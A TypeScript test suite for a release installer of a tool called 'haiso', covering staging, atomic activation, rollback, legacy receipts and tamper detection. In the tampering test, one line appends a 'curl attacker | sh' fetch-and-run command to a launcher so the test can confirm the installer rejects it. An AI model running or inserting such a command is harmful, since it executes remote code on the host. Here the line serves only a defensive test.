import { afterAll, afterEach, beforeAll, describe, expect, it } from "bun:test";
import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";
import { readLines } from "@oh-my-pi/pi-utils/stream";
import {
	activateHaiso,
	currentHaisoRelease,
	type InstallOptions,
	type InstallReceipt,
	readHaisoRelease,
	rollbackHaiso,
	shellQuote,
	stageHaiso,
} from "./release";

const temporaryDirectories: string[] = [];
let fixtureRoot: string;
let compiledFixture: string;

const UPDATER_FIXTURE = `import * as fs from "node:fs";
import * as path from "node:path";
const args = process.argv.slice(2);
const json = JSON.stringify({ updater: true, args, runtime: process.execPath, prefix: process.env.HAISO_PREFIX });
if (args[0] === "--background") {
  const report = path.join(import.meta.dir, "background.json");
  fs.writeFileSync(report + ".tmp", json);
  fs.renameSync(report + ".tmp", report);
} else console.log(json);
`;

async function removeFixture(directory: string): Promise<void> {
	// Only our private fixture directories are thawed; never follow the active-prefix symlink.
	await fs.chmod(directory, 0o700);
	for (const entry of await fs.readdir(directory, { withFileTypes: true })) {
		if (entry.isDirectory()) await removeFixture(path.join(directory, entry.name));
	}
	await fs.rm(directory, { recursive: true, force: true });
}

async function run(
	command: string[],
	cwd: string,
	env: NodeJS.ProcessEnv = process.env,
): Promise<{ code: number; stdout: string; stderr: string }> {
	const child = Bun.spawn(command, { cwd, env, stdin: "ignore", stdout: "pipe", stderr: "pipe" });
	const [stdout, stderr, code] = await Promise.all([
		new Response(child.stdout).text(),
		new Response(child.stderr).text(),
		child.exited,
	]);
	return { code, stdout: stdout.trim(), stderr: stderr.trim() };
}

async function execute(command: string[], cwd: string, env: NodeJS.ProcessEnv = process.env): Promise<string> {
	const result = await run(command, cwd, env);
	if (result.code !== 0) throw new Error(`Command exited ${result.code}: ${result.stderr}`);
	return result.stdout;
}

beforeAll(async () => {
	fixtureRoot = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "haiso-compiled-fixture-")));
	const entrypoint = path.join(fixtureRoot, "fixture.ts");
	compiledFixture = path.join(fixtureRoot, "haiso");
	await fs.writeFile(
		entrypoint,
		`import * as fs from "node:fs";
import * as path from "node:path";
const selector = process.argv[2];
const prefix = process.env.HAISO_PREFIX;
const controlFile = prefix && path.join(path.dirname(prefix), "smoke-control.json");
const control = controlFile && fs.existsSync(controlFile) ? JSON.parse(fs.readFileSync(controlFile, "utf8")) : {};
if (selector === "--version") console.log("haiso/18.3.0");
else if (selector === "--smoke-test") {
  if (!process.env.HOME || !process.env.PI_CODING_AGENT_DIR?.startsWith(process.env.HOME + "/") ||
      !process.env.XDG_CONFIG_HOME?.startsWith(process.env.HOME + "/") ||
      process.cwd() !== process.env.HOME || process.env.HAISO_UPDATE_DISABLED !== "1" ||
      process.env.OPENAI_API_KEY || process.env.ANTHROPIC_API_KEY || process.env.SSH_AUTH_SOCK ||
      process.env.PI_PROFILE || process.env.BUN_BE_BUN || process.env.PI_COMPILED) process.exit(71);
  if (control.failSmoke) process.exit(72);
  if (control.denyPublication) fs.chmodSync(control.binDir, 0o500);
  if (control.raceLauncher) fs.writeFileSync(control.launcher, "concurrent-owner\\n");
  console.log("smoke-test: ok");
} else if (selector === "--wait-worker") {
  console.log("READY");
  await Bun.stdin.text();
  const worker = Bun.spawn([process.execPath, "--worker"], { stdin: "ignore", stdout: "pipe", stderr: "pipe" });
  process.stdout.write(await new Response(worker.stdout).text());
  process.exit(await worker.exited);
} else console.log(JSON.stringify({
  cwd: process.cwd(), args: process.argv.slice(2), executable: process.execPath,
  prefix: process.env.HAISO_PREFIX, bunBeBun: process.env.BUN_BE_BUN ?? null,
  compiled: process.env.PI_COMPILED ?? null,
}));
`,
	);
	await execute([process.execPath, "build", "--compile", entrypoint, "--outfile", compiledFixture], fixtureRoot);
}, 120_000);

afterEach(async () => {
	for (const directory of temporaryDirectories.splice(0)) await removeFixture(directory);
});

afterAll(async () => {
	if (fixtureRoot) await removeFixture(fixtureRoot);
});

async function fixture(): Promise<{ root: string; options: InstallOptions; control: string; updater: string }> {
	const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "haiso-install-' spaces-")));
	temporaryDirectories.push(root);
	const binary = path.join(root, "build output ' haiso");
	const runtime = path.join(root, "standalone bun");
	await fs.copyFile(compiledFixture, binary);
	await fs.copyFile(process.execPath, runtime);
	await fs.chmod(binary, 0o700);
	await fs.chmod(runtime, 0o700);
	const repo = path.join(root, "repo ' checkout");
	const updater = path.join(repo, "scripts/haiso/update.ts");
	await fs.mkdir(path.dirname(updater), { recursive: true });
	await fs.writeFile(updater, UPDATER_FIXTURE);
	const prefix = path.join(root, "install ' root", "fork");
	return {
		root,
		updater,
		control: path.join(path.dirname(prefix), "smoke-control.json"),
		options: {
			binary,
			runtime,
			upstream: { tag: "v18.3.0", commit: "62bc57be1b03ef0802a33cf7f5f530e534527531" },
			source: { repo, commit: "a".repeat(40), haisoCommit: "b".repeat(40) },
			prefix,
			binDir: path.join(root, "bin ' directory"),
			stateDir: path.join(root, "state ' dir"),
		},
	};
}

async function install(options: InstallOptions): Promise<InstallReceipt> {
	const staged = await stageHaiso(options);
	return activateHaiso(staged.release, {
		expectedCurrent: staged.activationBaseline,
		replaceLegacy: options.replaceLegacy,
	});
}

async function sha256(file: string): Promise<string> {
	return new Bun.CryptoHasher("sha256").update(await Bun.file(file).arrayBuffer()).digest("hex");
}

/** Recreate a release as the retired fork.patch installer sealed it (receipt schema 2). */
async function installLegacyRelease(options: InstallOptions): Promise<string> {
	const prefix = options.prefix!;
	await fs.mkdir(path.dirname(prefix), { recursive: true });
	await fs.mkdir(options.binDir!, { recursive: true });
	const release = await fs.mkdtemp(path.join(path.dirname(prefix), `.${path.basename(prefix)}-release-`));
	await fs.mkdir(path.join(release, "bin"));
	await fs.mkdir(path.join(release, "runtime"));
	const executable = path.join(release, "bin/haiso");
	const runtime = path.join(release, "runtime/bun");
	const forkPatch = path.join(release, "fork.patch");
	await fs.copyFile(options.binary, executable);
	await fs.copyFile(options.runtime, runtime);
	await fs.writeFile(forkPatch, "frozen fork patch\n");
	await fs.writeFile(
		path.join(release, "bin/launch"),
		`#!/bin/sh\nunset BUN_BE_BUN PI_COMPILED\nHAISO_PREFIX=${shellQuote(prefix)}\nexport HAISO_PREFIX\nexec ${shellQuote(executable)} "$@"\n`,
	);
	for (const [file, mode] of [
		[executable, 0o500],
		[runtime, 0o500],
		[forkPatch, 0o400],
		[path.join(release, "bin/launch"), 0o500],
	] as const)
		await fs.chmod(file, mode);
	const receipt = {
		schemaVersion: 2,
		owner: "haiso-release-installer",
		id: path.basename(release),
		installedAt: new Date().toISOString(),
		version: "haiso/18.3.0",
		prefix,
		launcher: path.join(options.binDir!, "haiso"),
		release,
		executable,
		executableSha256: await sha256(executable),
		forkPatch,
		forkPatchSha256: await sha256(forkPatch),
		upstream: options.upstream,
		compatibility: { state: "1".repeat(64), broker: "2".repeat(64) },
		runtime: {
			suppliedPath: options.runtime,
			installedPath: runtime,
			version: Bun.version,
			sha256: await sha256(runtime),
		},
		previousRelease: null,
		activationBaseline: null,
	};
	const receiptPath = path.join(release, "receipt.json");
	await fs.writeFile(receiptPath, `${JSON.stringify(receipt, null, 2)}\n`, { mode: 0o400 });
	await fs.writeFile(path.join(release, "receipt.sha256"), `${await sha256(receiptPath)}\n`, { mode: 0o400 });
	for (const directory of [path.join(release, "bin"), path.join(release, "runtime"), release])
		await fs.chmod(directory, 0o500);
	await fs.symlink(release, prefix);
	await fs.symlink(path.join(prefix, "bin/launch"), path.join(options.binDir!, "haiso"));
	return release;
}

describe("Haiso compiled releases", () => {
	it("freezes the build and standalone runtime while preserving exact arguments and caller cwd", async () => {
		const { root, options } = await fixture();
		const caller = path.join(root, "caller project");
		await fs.mkdir(caller);
		const receipt = await install(options);
		await fs.writeFile(options.binary, "replaced build output\n");
		await fs.writeFile(options.runtime, "replaced build runtime\n");
		const args = ["with spaces", "quote'\"", "", "$HOME", "--dash"];
		expect(
			JSON.parse(
				await execute([receipt.launcher, ...args], caller, {
					...process.env,
					BUN_BE_BUN: "1",
					PI_COMPILED: "1",
					HAISO_PREFIX: "/incorrect",
				}),
			),
		).toEqual({
			cwd: caller,
			args,
			executable: receipt.executable,
			prefix: receipt.prefix,
			bunBeBun: null,
			compiled: null,
		});
		expect(await execute([receipt.launcher, "--version"], caller)).toBe("haiso/18.3.0");
		expect(await execute([receipt.runtime.installedPath, "-e", "console.log(Bun.version)"], caller)).toBe(
			Bun.version,
		);
		expect((await readHaisoRelease(receipt.release)).executableSha256).toBe(receipt.executableSha256);
		expect((await fs.lstat(receipt.executable)).mode & 0o222).toBe(0);
	}, 120_000);

	it("routes `haiso update` to the repository updater on the frozen runtime, keeping plugin updates in the binary", async () => {
		const { root, options, updater } = await fixture();
		const receipt = await install(options);
		expect(JSON.parse(await execute([receipt.launcher, "update", "--check", "--force"], root))).toEqual({
			updater: true,
			args: ["--check", "--force"],
			runtime: receipt.runtime.installedPath,
			prefix: receipt.prefix,
		});
		expect(JSON.parse(await execute([receipt.launcher, "update", "--plugins", "extra"], root)).args).toEqual([
			"update",
			"--plugins",
			"extra",
		]);
		expect(JSON.parse(await execute([receipt.launcher, "update", "-l"], root)).args).toEqual(["update", "-l"]);
		await fs.rm(updater);
		const missing = await run([receipt.launcher, "update"], root);
		expect(missing.code).toBe(1);
		expect(missing.stderr).toContain(`updater not found: ${updater}`);
	}, 120_000);

	it("prints the held-update notice and schedules at most one background check per day", async () => {
		const { root, options, updater } = await fixture();
		const receipt = await install(options);
		const stateDir = options.stateDir!;
		await fs.mkdir(stateDir, { recursive: true });
		await fs.writeFile(
			path.join(stateDir, "settings.json"),
			JSON.stringify({ schemaVersion: 1, enabled: true }, null, 2),
		);
		const notice = "haiso: update to v18.4.0 held (conflict) — run: haiso update --status";
		await fs.writeFile(path.join(stateDir, "notice"), `${notice}\n`);
		const env: NodeJS.ProcessEnv = { ...process.env };
		delete env.HAISO_UPDATE_DISABLED;
		const marker = path.join(path.dirname(updater), "background.json");
		const lastCheck = path.join(stateDir, "last-check");
		const launchedCheck = async () => {
			// The detached check exposes no completion signal besides the report it writes.
			const deadline = Date.now() + 15_000;
			while (!(await Bun.file(marker).exists()) && Date.now() < deadline) await Bun.sleep(50);
			const report = JSON.parse(await Bun.file(marker).text());
			await fs.rm(marker);
			return report;
		};
		const stampedAt = async () => Math.floor((await fs.stat(lastCheck)).mtimeMs / 1000);

		expect(await run([receipt.launcher, "--version"], root, env)).toEqual({
			code: 0,
			stdout: "haiso/18.3.0",
			stderr: notice,
		});
		expect(await Bun.file(lastCheck).exists()).toBe(true);
		expect(await launchedCheck()).toMatchObject({ args: ["--background"], runtime: receipt.runtime.installedPath });

		const recent = new Date(Date.now() - 60 * 60 * 1000);
		await fs.utimes(lastCheck, recent, recent);
		expect((await run([receipt.launcher, "--version"], root, env)).stdout).toBe("haiso/18.3.0");
		expect(await stampedAt()).toBe(Math.floor(recent.getTime() / 1000));

		const stale = new Date(Date.now() - 2 * 24 * 60 * 60 * 1000);
		await fs.utimes(lastCheck, stale, stale);
		expect((await run([receipt.launcher, "--version"], root, env)).stdout).toBe("haiso/18.3.0");
		expect(await stampedAt()).toBeGreaterThan(Math.floor(recent.getTime() / 1000));
		expect((await launchedCheck()).args).toEqual(["--background"]);
	}, 120_000);

	it("keeps running processes and their later workers pinned while new launches switch atomically", async () => {
		const { root, options } = await fixture();
		const first = await install(options);
		const child = Bun.spawn([first.launcher, "--wait-worker"], {
			cwd: root,
			stdin: "pipe",
			stdout: "pipe",
			stderr: "pipe",
		});
		const lines = readLines(child.stdout);
		const decoder = new TextDecoder();
		try {
			expect(decoder.decode((await lines.next()).value)).toBe("READY");
			const second = await install(options);
			child.stdin.write("continue\n");
			child.stdin.end();
			const worker = JSON.parse(decoder.decode((await lines.next()).value));
			expect(await child.exited).toBe(0);
			expect(worker.executable).toBe(first.executable);
			expect(worker.args).toEqual(["--worker"]);
			expect(JSON.parse(await execute([second.launcher, "--worker"], root)).executable).toBe(second.executable);
			expect(await execute([first.executable, "--version"], root)).toBe("haiso/18.3.0");
		} finally {
			child.kill();
			await child.exited;
			await lines.return(undefined);
		}
	}, 120_000);

	it("rolls back to the retained previous release and leaves official omp untouched", async () => {
		const { root, options } = await fixture();
		await fs.mkdir(options.binDir!, { recursive: true });
		const omp = path.join(options.binDir!, "omp");
		await fs.writeFile(omp, "official omp\n");
		const first = await install(options);
		const second = await install(options);
		expect(second.previousRelease).toBe(first.release);
		expect((await rollbackHaiso({ prefix: options.prefix })).release).toBe(first.release);
		expect((await currentHaisoRelease(options.prefix))?.release).toBe(first.release);
		expect(JSON.parse(await execute([first.launcher], root)).executable).toBe(first.executable);
		expect(await execute([second.executable, "--version"], root)).toBe("haiso/18.3.0");
		expect(await fs.readFile(omp, "utf8")).toBe("official omp\n");
	}, 120_000);

	it("keeps a legacy v2 release readable and restorable after a branch-built update", async () => {
		const { root, options } = await fixture();
		const legacy = await installLegacyRelease(options);
		const before = await currentHaisoRelease(options.prefix);
		expect(before).toMatchObject({ schemaVersion: 2, release: legacy, upstream: options.upstream });
		expect(before?.source).toBeUndefined();

		const updated = await install(options);
		expect(updated).toMatchObject({ schemaVersion: 3, previousRelease: legacy, source: options.source });
		expect((await rollbackHaiso({ prefix: options.prefix })).release).toBe(legacy);
		expect(JSON.parse(await execute([updated.launcher], root)).executable).toBe(path.join(legacy, "bin/haiso"));
	}, 120_000);

	it("refuses activation when the active release moved since staging", async () => {
		const { options } = await fixture();
		const first = await install(options);
		const stale = await stageHaiso(options);
		const current = await install(options);
		await expect(activateHaiso(stale.release, { expectedCurrent: first.release })).rejects.toThrow(
			"active-release drift",
		);
		await expect(activateHaiso(stale.release, {})).rejects.toThrow("active-release drift");
		expect((await currentHaisoRelease(options.prefix))?.release).toBe(current.release);
	}, 120_000);

	it("rejects receipt, launcher and retained artifact tampering without replacing the launchable release", async () => {
		const { root, options } = await fixture();
		const first = await install(options);
		const thaw = async (file: string, change: () => Promise<void>) => {
			const mode = (await fs.lstat(file)).mode & 0o777;
			await fs.chmod(file, 0o700);
			await change();
			await fs.chmod(file, mode);
		};
		const receipt = await stageHaiso(options);
		const receiptPath = path.join(receipt.release, "receipt.json");
		await thaw(receiptPath, () =>
			fs.writeFile(receiptPath, JSON.stringify({ ...receipt, source: { ...receipt.source, repo: "/elsewhere" } })),
		);
		await expect(activateHaiso(receipt.release, {})).rejects.toThrow("Tampered install receipt");
		const launcher = await stageHaiso(options);
		const wrapper = path.join(launcher.release, "bin/launch");
		await thaw(wrapper, () => fs.appendFile(wrapper, "curl attacker | sh\n"));
		await expect(activateHaiso(launcher.release, {})).rejects.toThrow("Tampered release launcher");
		const binary = await stageHaiso(options);
		await thaw(binary.executable, () => fs.appendFile(binary.executable, "tampered executable"));
		await expect(activateHaiso(binary.release, {})).rejects.toThrow("hash mismatch");
		const runtime = await stageHaiso(options);
		await thaw(runtime.runtime.installedPath, () => fs.appendFile(runtime.runtime.installedPath, "tampered runtime"));
		await expect(activateHaiso(runtime.release, {})).rejects.toThrow("hash mismatch");
		const symlinked = await stageHaiso(options);
		await thaw(path.dirname(symlinked.executable), async () => {
			await fs.unlink(symlinked.executable);
			await fs.symlink(first.executable, symlinked.executable);
		});
		await expect(activateHaiso(symlinked.release, {})).rejects.toThrow("Unsafe or mutable release file");
		expect((await currentHaisoRelease(options.prefix))?.release).toBe(first.release);
		expect(JSON.parse(await execute([first.launcher], root)).executable).toBe(first.executable);
	}, 120_000);

	it("rejects symlinked, foreign and group-writable installation boundaries", async () => {
		const { root, options } = await fixture();
		const actual = path.join(root, "actual");
		await fs.mkdir(actual);
		const linkedParent = path.join(root, "linked-parent");
		await fs.symlink(actual, linkedParent);
		await expect(stageHaiso({ ...options, prefix: path.join(linkedParent, "fork") })).rejects.toThrow(
			"symlink directory",
		);
		await fs.mkdir(path.dirname(options.prefix!), { recursive: true });
		await fs.symlink(actual, options.prefix!);
		await expect(stageHaiso(options)).rejects.toThrow("unrecognized install root target");
		await fs.unlink(options.prefix!);
		await fs.chmod(actual, 0o770);
		await expect(stageHaiso({ ...options, prefix: path.join(actual, "fork") })).rejects.toThrow(
			"writable by other users",
		);
	}, 120_000);

	it("rejects non-native runtimes, bad pins and failed isolated smoke without publication", async () => {
		const { root, options, control } = await fixture();
		const fakeRuntime = path.join(root, "fake-bun");
		await fs.writeFile(fakeRuntime, "#!/bin/sh\nprintf '1.4.2\\n'\n", { mode: 0o700 });
		await expect(install({ ...options, runtime: fakeRuntime })).rejects.toThrow("not a native binary");
		await expect(stageHaiso({ ...options, runtime: options.binary })).rejects.toThrow("Unexpected Bun --version");
		await expect(stageHaiso({ ...options, upstream: { ...options.upstream, tag: "v18.3.1" } })).rejects.toThrow(
			"Compiled Haiso validation expected haiso/18.3.1",
		);
		await expect(stageHaiso({ ...options, upstream: { ...options.upstream, commit: "main" } })).rejects.toThrow(
			"full commit",
		);
		await expect(stageHaiso({ ...options, source: { ...options.source, haisoCommit: "haiso" } })).rejects.toThrow(
			"full built and haiso commits",
		);
		await fs.mkdir(path.dirname(options.prefix!), { recursive: true });
		await fs.writeFile(control, JSON.stringify({ failSmoke: true }));
		await expect(install(options)).rejects.toThrow("Validation failed");
		await expect(fs.lstat(options.prefix!)).rejects.toHaveProperty("code", "ENOENT");
		await expect(fs.lstat(path.join(options.binDir!, "haiso"))).rejects.toHaveProperty("code", "ENOENT");
	}, 120_000);

	it("requires explicit legacy replacement and never makes a mutable v1 install rollback-eligible", async () => {
		const { root, options } = await fixture();
		await fs.mkdir(path.dirname(options.prefix!), { recursive: true });
		await fs.mkdir(options.binDir!, { recursive: true });
		const legacy = path.join(path.dirname(options.prefix!), ".fork-release-legacy");
		await fs.mkdir(legacy, { mode: 0o700 });
		const legacyLauncher = path.join(legacy, "legacy-launcher");
		await fs.writeFile(legacyLauncher, "#!/bin/sh\nprintf 'mutable legacy\\n'\n", { mode: 0o700 });
		await fs.writeFile(
			path.join(legacy, "receipt.json"),
			JSON.stringify({ schemaVersion: 1, owner: "haiso-source-installer", prefix: options.prefix, release: legacy }),
			{ mode: 0o600 },
		);
		await fs.symlink(legacy, options.prefix!);
		const launcher = path.join(options.binDir!, "haiso");
		await fs.symlink(legacyLauncher, launcher);
		await expect(install(options)).rejects.toThrow("replaceLegacy");
		expect(await execute([launcher], root)).toBe("mutable legacy");
		const release = await install({ ...options, replaceLegacy: true });
		expect(release.previousRelease).toBeNull();
		await expect(rollbackHaiso({ prefix: options.prefix })).rejects.toThrow("mutable v1");
		await expect(activateHaiso(legacy, { expectedCurrent: release.release })).rejects.toThrow(
			"Unsafe or mutable release directory",
		);
		expect(await execute([legacyLauncher], root)).toBe("mutable legacy");
		expect(await execute([launcher, "--version"], root)).toBe("haiso/18.3.0");
	}, 120_000);

	it.skipIf(process.getuid?.() === 0)(
		"restores the old root when the first stable-launcher publication fails",
		async () => {
			const { root, options, control } = await fixture();
			const first = await install(options);
			// Simulate a retained pre-stable launcher: it must survive failed replacement.
			await fs.unlink(first.launcher);
			await fs.symlink(path.join(first.release, "bin/launch"), first.launcher);
			const candidate = await stageHaiso({ ...options, replaceLegacy: true });
			await fs.writeFile(control, JSON.stringify({ denyPublication: true, binDir: options.binDir }));
			try {
				await expect(
					activateHaiso(candidate.release, { expectedCurrent: first.release, replaceLegacy: true }),
				).rejects.toHaveProperty("code", "EACCES");
				expect(await fs.readlink(first.prefix)).toBe(first.release);
				expect(await execute([first.launcher, "--version"], root)).toBe("haiso/18.3.0");
			} finally {
				await fs.chmod(options.binDir!, 0o700);
			}
		},
		120_000,
	);

	it("does not overwrite a launcher created during isolated staged validation", async () => {
		const { options, control } = await fixture();
		await fs.mkdir(path.dirname(options.prefix!), { recursive: true });
		const launcher = path.join(options.binDir!, "haiso");
		await fs.writeFile(control, JSON.stringify({ raceLauncher: true, launcher }));
		await expect(install(options)).rejects.toThrow("Path changed during installation");
		expect(await fs.readFile(launcher, "utf8")).toBe("concurrent-owner\n");
		await expect(fs.lstat(options.prefix!)).rejects.toHaveProperty("code", "ENOENT");
	}, 120_000);
});
